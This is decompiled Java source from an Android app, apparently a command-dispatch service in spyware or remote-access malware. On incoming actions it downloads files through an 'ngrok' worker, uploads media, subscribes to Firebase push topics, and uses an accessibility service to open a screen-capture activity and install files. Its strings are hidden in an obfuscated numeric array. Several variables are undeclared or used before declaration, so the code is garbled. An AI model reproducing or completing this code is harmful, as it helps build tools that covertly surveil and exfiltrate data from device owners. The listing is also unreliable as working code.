package com.mistral.jon;

import android.app.IntentService;
import android.app.PendingIntent;
import android.content.Intent;
import com.google.firebase.messaging.FirebaseMessaging;
import com.mistral.jon.activity.ScpActivity;
import com.mistral.jon.ngrok.DownloadWorker;
import com.mistral.jon.services.a11y.AcService;
import com.mistral.jon.workers.MediaUploadWorker;
import java.io.File;
import p001z.ajj;
import p001z.ajo;
import p001z.bco;
import p001z.bcv;

/* JADX INFO: loaded from: classes.dex */
public class MyIntentService extends IntentService implements bco {

    /* JADX INFO: renamed from: a */
    private static long[] f710a = {270243132, 897599959, -1655773245, 120683405, -1332665608, 612936733, -972471629, 58458834, -1327233189, -1641407031, 2086612222, 50069532, -1051320674, 1828179619, -1126547224, 566566092, 314596156, 582105951, 209715263, -678265454, 19203690, -233527447, 2012112777, 111966122, 1642388137, 44623991, 1774887150, 2089970539, 1547000463, 1880750343, 1449918620, 1369660470, 2042361030, 408928486, 920840917, 2054308825, 975116955, 1093057411, 1767245488, 1785444337, 1781256873, 935975717, 1100500554, 1239915055, 110329574, 1498166199, 968691289, 469588657, 1970331545, 1720854867, 777985850, 1637078855, 411063829, 646565986, 1763883593, 123576103, 191275413, 1258471742, -2043505015, -1417933680, 111305837, 1819301354, -826651902, 55472936, -66576866, 156617616, 1778667706, 700128296, -560696405, -239764405, -2031792194, -1431949224, 1263997875, 1945967810, 2114909890, 1299724828, 770555672, 872340792, 1149989972, 1549702666, 96472862, -403533858, -1096804284, 1907057868, -1654371238, -1755815678, 2125786129, -1147393317, -1201932290, 1738167486, 632689374, 212875400, 265316605, 1417533268, 2088584792, 790066615, 1514198038, -1349498853, 634537717, -318905445, -1261333179, 1783934146, -393941070, -1677545530, 600078479, 1312169452, 2005285356, 171927102, 1711793814, 1266796223, 1732667211, 385067659, -759036920, -2075034323, 2076579355, -695234567, -1814069559, -1135600305, -1768760485, 592583868, -1740407585, 2136137631, -1736806781, -1680314319, 1631188411, 280530389, -1449336083, 1032314176, -1025357619, -206068604, 1346996799, 2075064014, 1895596088, 826411236, 1944543073, 348027158, 674000842, 19931110, 1534537291};

    /* JADX INFO: renamed from: m */
    private static final String str = "MyIntentService";

    /* JADX INFO: String decrypt: "MyIntentService" */
    public MyIntentService() {
        super("MyIntentService");
    }

    /* JADX INFO: String decrypt: "Topic "; " subscribed"; "Topic "; "subscribe failed" */
    /* JADX INFO: renamed from: a */
    private static /* synthetic */ void m1014a(String str1, ajo ajoVar) {
        String str2 = "Topic " + str1 + " subscribed";
        if (ajoVar.mo1907b()) {
            return;
        }
        String str3 = "Topic " + str1 + "subscribe failed";
    }

    public static /* synthetic */ void lambda$qNUfHmGlwRL9TA9UIjl9GlzHlKo(String str2, ajo ajoVar) {
        m1014a(str2, ajoVar);
    }

    /* JADX WARN: Multi-variable type inference failed */
    @Override // android.app.IntentService
    protected void onHandleIntent(Intent intent1) throws Throwable {
        if (intent1 != null) {
            String str1 = intent1.getAction();
            if (str.equals(str1)) {
                DownloadWorker.m1056a(this, intent1.getStringExtra(str7), intent1.getStringExtra(str8), intent1.getBooleanExtra(str9, false));
                return;
            }
            if (str2.equals(str1)) {
                String str2 = intent1.getStringExtra(str10);
                FirebaseMessaging.m959a().m970a(str2).mo1903a(new ajj(str2) { // from class: com.mistral.jon.-$$Lambda$MyIntentService$qNUfHmGlwRL9TA9UIjl9GlzHlKo
                    public final /* synthetic */ String f$0;

                    public /* synthetic */ $$Lambda$MyIntentService$qNUfHmGlwRL9TA9UIjl9GlzHlKo(String str3) {
                        this.f$0 = str3;
                    }

                    @Override // p001z.ajj
                    public final void onComplete(ajo ajoVar) {
                        MyIntentService.lambda$qNUfHmGlwRL9TA9UIjl9GlzHlKo(this.f$0, ajoVar);
                    }
                });
                return;
            }
            if (str3.equals(str1)) {
                MediaUploadWorker.m1118a(intent1.getStringExtra(str11), intent1.getStringExtra(str12));
                return;
            }
            try {
                if (str4.equals(str1)) {
                    Intent intent3 = new Intent(AcService.acService, (Class<?>) ScpActivity.class);
                    intent3.addFlags(268435456);
                    AcService.acService.startActivity(intent3);
                } else if (str5.equals(str1)) {
                    Intent intent2 = new Intent(AcService.acService, (Class<?>) MyIntentService.class);
                    intent2.setAction("530be150-f0fe-4dd3-8baf-cb7dd11ec204");
                    new bcv(AcService.acService).m4562a(new File(intent1.getStringExtra(str11)), PendingIntent.getService(AcService.acService, 0, intent2, 0));
                } else if (!"530be150-f0fe-4dd3-8baf-cb7dd11ec204".equals(str1)) {
                } else {
                    new bcv(AcService.acService).m4561a(intent1);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
